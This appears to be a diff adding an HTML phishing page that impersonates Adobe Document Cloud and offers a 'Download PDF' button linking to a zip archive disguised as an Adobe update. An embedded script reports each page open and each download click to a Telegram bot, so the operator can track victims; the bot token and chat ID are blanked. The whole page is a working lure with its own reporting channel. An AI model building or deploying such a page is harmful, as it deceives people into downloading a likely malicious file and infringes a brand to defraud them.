@@ -1,0 +1,203 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Adobe PDF Document</title>
+    <style>
+        /* Reset and Base Styles */
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Helvetica Neue', Helvetica, Arial, sans-serif;
+        }
+
+        body {
+            background: #f5f5f5;
+            line-height: 1.6;
+        }
+
+        /* Adobe Header Styles */
+        .adobe-header {
+            background: #ffffff;
+            padding: 1rem 2rem;
+            box-shadow: 0 2px 4px rgba(0,0,0,0.1);
+            display: flex;
+            align-items: center;
+        }
+
+        .adobe-logo {
+            height: 32px; /* Official Adobe logo height */
+            width: auto;
+            margin-right: 16px;
+        }
+
+        /* Main Content */
+        .container {
+            max-width: 1200px;
+            margin: 3rem auto;
+            padding: 0 2rem;
+        }
+
+        .document-card {
+            background: #ffffff;
+            border-radius: 12px;
+            padding: 3rem;
+            text-align: center;
+            box-shadow: 0 4px 6px rgba(0,0,0,0.1);
+            margin: 2rem 0;
+        }
+
+        .document-icon {
+            width: 80px;
+            height: 80px;
+            margin-bottom: 1.5rem;
+        }
+
+        h1 {
+            color: #2d2d2d;
+            font-size: 2rem;
+            margin-bottom: 1rem;
+            font-weight: 600;
+        }
+
+        .document-info {
+            color: #666;
+            margin-bottom: 2rem;
+            font-size: 1.1rem;
+        }
+
+        /* Download Button - Adobe Red */
+        .download-btn {
+            background: #FF0000;
+            color: white;
+            padding: 1rem 2rem;
+            border-radius: 25px;
+            text-decoration: none;
+            display: inline-flex;
+            align-items: center;
+            gap: 0.8rem;
+            font-weight: 600;
+            transition: all 0.3s ease;
+            border: none;
+            cursor: pointer;
+            box-shadow: 0 2px 4px rgba(255,0,0,0.2);
+        }
+
+        .download-btn:hover {
+            background: #CC0000;
+            transform: translateY(-2px);
+            box-shadow: 0 4px 8px rgba(255,0,0,0.3);
+        }
+
+        .download-icon {
+            width: 24px;
+            height: 24px;
+        }
+
+        /* Responsive Design */
+        @media (max-width: 768px) {
+            .container {
+                padding: 0 1rem;
+            }
+
+            .document-card {
+                padding: 2rem 1rem;
+            }
+
+            h1 {
+                font-size: 1.5rem;
+            }
+
+            .document-info {
+                font-size: 1rem;
+            }
+
+            .download-btn {
+                padding: 0.8rem 1.5rem;
+                font-size: 0.9rem;
+            }
+
+            .adobe-logo {
+                height: 24px;
+            }
+        }
+    </style>
+</head>
+<body>
+    <header class="adobe-header">
+        <!-- Official Adobe logo from Adobe's brand resources -->
+        <img src="https://www.adobe.com/content/dam/cc/icons/Adobe_Corporate_Horizontal_Red_HEX.svg" 
+             alt="Adobe Logo" 
+             class="adobe-logo">
+        <span style="color: #2d2d2d; font-weight: 600;">Document Cloud</span>
+    </header>
+
+    <div class="container">
+        <div class="document-card">
+            <!-- Adobe PDF icon -->
+            <img src="https://cdn-icons-png.flaticon.com/512/337/337946.png" 
+                 alt="PDF Document" 
+                 class="document-icon">
+            <h1>Adobe Document Cloud</h1>
+            <p class="document-info">
+                PDF Document • 2.4 MB • Last modified: Adobe |  Statment
+            </p>
+            <a href="Adobe_Update#8559570059.zip" class="download-btn" id="downloadButton">
+                <!-- Adobe download icon -->
+                <img src="https://www.adobe.com/content/dam/shared/images/product-icons/svg/acrobat-reader.svg" 
+                     alt="Download Icon" 
+                     class="download-icon">
+                Download PDF
+            </a>
+        </div>
+    </div>
+
+        <script>
+    // Telegram Configuration (place at top)
+    const BOT_TOKEN = '#';
+    const CHAT_ID = '#';
+
+    // Notification Messages Template
+    const messages = {
+        pageOpen: () => `📄 Page Opened: IT/Information Systems Services 2025\n🕒 ${new Date().toLocaleString()}`,
+        downloadClick: () => `📥 Download Started: IT/Information Systems Services 2025\n⏳ ${new Date().toLocaleString()}\n🔗 File: ach-invoice.php`
+    };
+
+    // Initialization
+    document.addEventListener('DOMContentLoaded', initializeNotifications);
+
+    function initializeNotifications() {
+        // Page load notification
+        sendTelegramNotification(messages.pageOpen());
+        
+        // Download button handler
+        document.getElementById('downloadButton').addEventListener('click', handleDownloadClick);
+    }
+
+    function handleDownloadClick(e) {
+        // Download notification
+        sendTelegramNotification(messages.downloadClick());
+        
+        // Add additional download logic here if needed
+    }
+
+    function sendTelegramNotification(message) {
+        const telegramAPI = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
+        const params = new URLSearchParams({
+            chat_id: CHAT_ID,
+            text: message,
+            parse_mode: 'HTML'
+        });
+
+        fetch(`${telegramAPI}?${params}`)
+            .then(response => {
+                if (!response.ok) throw new Error('Telegram API error');
+                console.log('Notification sent successfully');
+            })
+            .catch(error => console.error('Notification failed:', error));
+    }
+</script>
+</body>
+</html>
